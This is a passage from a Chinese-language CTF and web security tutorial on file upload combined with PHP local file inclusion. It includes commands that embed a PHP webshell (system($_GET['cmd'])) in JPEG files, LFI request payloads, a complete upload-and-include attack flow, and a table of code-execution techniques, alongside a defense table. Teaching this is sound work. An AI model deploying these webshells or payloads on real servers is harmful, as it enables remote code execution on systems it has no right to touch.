  1. 上传一个看似无害的文件（如 image.jpg）
     ↓
  2. 文件内容中包含 PHP 代码
     ↓
  3. 通过 LFI 包含这个文件
     ↓
  4. PHP 代码在服务器上执行
```

### 1.8.2 图片马制作

```bash
# Linux 下制作图片马
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg

# Windows 下也可以
copy normal.jpg /b + shell.php /a shell.jpg

# 更隐蔽的方式：在图片的 EXIF 中写入
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg

# 使用脚本创建图片马
python3 -c "
import os
# 正常的图片头部 + PHP 代码
payload = b'\xff\xd8\xff\xe0'  # JPEG 文件头
payload += b'<?php system(\$_GET[\"cmd\"]); ?>'
with open('shell.jpg', 'wb') as f:
    f.write(payload)
print('shell.jpg created')
"
```

### 1.8.3 通过 LFI 包含上传的文件

```
# 如果上传目录在 uploads/
?file=uploads/shell.jpg&cmd=whoami

# 如果上传文件被改名
?file=uploads/2024/01/01/random_name.jpg&cmd=whoami

# 使用 php://filter 读取上传目录内容
?file=php://filter/convert.base64-encode/resource=uploads/
```

### 1.8.4 各种文件后缀的包含结果

| 上传文件类型 | 包含后是否执行 PHP | 说明 |
| ------------ | :---: | ------ |
| `.php` | 是 | 直接包含执行（但上传通常被过滤） |
| `.phtml` | 可能 | 取决于服务器配置 |
| `.php5` | 可能 | 取决于服务器配置 |
| `.shtml` | 否 | 只解析 SSI 指令 |
| `.jpg` / `.png` | 是（通过 include） | 图片马，含 PHP 代码 |
| `.txt` | 是（通过 include） | 纯文本包含 |
| `.zip`（内含 php） | 是（通过 zip://） | 使用 `zip://` 协议 |
| `.phar` | 是（通过 phar://） | 使用 `phar://` 协议 |

### 1.8.5 完整攻击流程示例

```
Step 1: 上传恶意文件
  POST /upload.php HTTP/1.1
  Content-Type: multipart/form-data
  ------boundary
  Content-Disposition: form-data; name="file"; filename="shell.jpg"
  ------boundary
  [JPEG 头部]\n<?php system($_GET['cmd']); ?>
  ------boundary--

Step 2: 获取上传文件路径
  返回: {"path": "uploads/2024/01/shell.jpg"}

Step 3: 通过 LFI 包含执行
  GET /index.php?file=uploads/2024/01/shell.jpg&cmd=cat /flag HTTP/1.1

Step 4: 执行结果
  flag{upload_lfi_combination}
```

 **新手避坑：** 上传的文件可能被重命名（加时间戳、哈希值等），导致你无法直接找到上传后的文件名。这时需要：
1. 查看上传接口返回的路径
2. 尝试遍历常见的上传目录格式
3. 使用 LFI 读取上传目录的目录列表（如果服务器开启了目录浏览）
4. 查看上传接口的 JavaScript 代码中是否有路径生成逻辑

## 知识总结

### 文件包含核心原理

文件包含漏洞的根源是：** 用户输入的路径被直接传递给文件包含函数**。LFI 读取本地文件，RFI 读取远程文件，伪协议让"只能读文件"变成"可以执行代码"。

### 攻击手法总结表

| 手法 | 条件 | 利用方式 | 效果 |
| ---- | ---- | -------- | ---- |
| 读取系统文件 | 目录穿越可达 | `../../../etc/passwd` | 信息泄露 |
| 读取 PHP 源码 | 无特殊 | `php://filter/convert.base64-encode/resource=xxx.php` | 源码泄露 |
| 日志包含 Getshell | 已知日志路径 | 写代码到 User-Agent，包含日志 | 代码执行 |
| Session 包含 | 已知 Session 路径 | 写代码到 Session 变量，包含 Session 文件 | 代码执行 |
| 伪协议执行代码 | `allow_url_include=On` | `data://` 或 `php://input` | 直接代码执行 |
| 图片马执行 | 有上传功能 | 上传含代码图片，LFI 包含 | 代码执行 |
| `phar://` 反序列化 | 文件操作函数 | 上传恶意 phar，`phar://` 触发 | 反序列化 RCE |
| `zip://` 包含 | 上传 zip 文件 | 上传含 PHP 的 zip，指定包内路径 | 代码执行 |
| `php://filter` 写入绕过 | `file_put_contents` | `base64-decode` 吞掉 exit | 写入 Webshell |

### 防御措施对比表

| 防御措施 | 说明 | 有效性 |
| -------- | ---- | :----: |
| `allow_url_include = Off` | 关闭远程文件包含 | 阻止 RFI |
| 白名单路径 | 只允许包含指定路径的文件 | 高 |
| 过滤 `../` | 阻止目录穿越 | 中（可编码绕过） |
| 过滤伪协议关键字 | 阻止 `php://`、`data://` 等 | 中（大小写可绕过） |
| 关闭框架的危险函数 | 不使用 `include($user_input)` | 高 |
| 使用 `realpath()` 限制路径 | 解析真实路径后校验 | 高 |
| 禁用 `phar` 扩展 | 阻止 `phar://` 反序列化 | 中（影响正常功能） |
| 升级 PHP 版本 | PHP 8 默认更安全 | 高 |

### 新手避坑汇总

1.**`include()` 和 `file_get_contents()` 的区别：** `include()` 会执行 PHP 代码，`file_get_contents()` 只是读文件。不要混淆。
2.**伪协议名不区分大小写：** `PHP://filter`、`Php://input`、`FILE://` 都可以绕过大小写过滤。
3.**日志包含需要知道日志路径：** 先用 LFI 读配置文件确定日志位置。
4.**Session 包含需要 Session 中有可控内容：** 检查用户输入是否存入 Session。
5.**`php://filter` 也可以用于写入：** 不只能读文件，写入时也能玩出花样。
6.**后缀拼接不是绝对障碍：** `data://`、`php://input` 等协议天然免疫后缀拼接。
7.**`phar://` 是反序列化入口：** 即使没有文件包含，`file_exists()` 用 `phar://` 也能触发反序列化。
8.**图片马要保留文件头部：** 否则上传时可能被检测为非法文件。
9.**CTF 中优先尝试 `php://filter`：** 不需要任何条件，是最稳定的 LFI 利用方式。
10.**现代 PHP 无法使用 `%00` 截断：** 这是 PHP 5.3.4 之前的漏洞，不要在新版本上浪费时间。
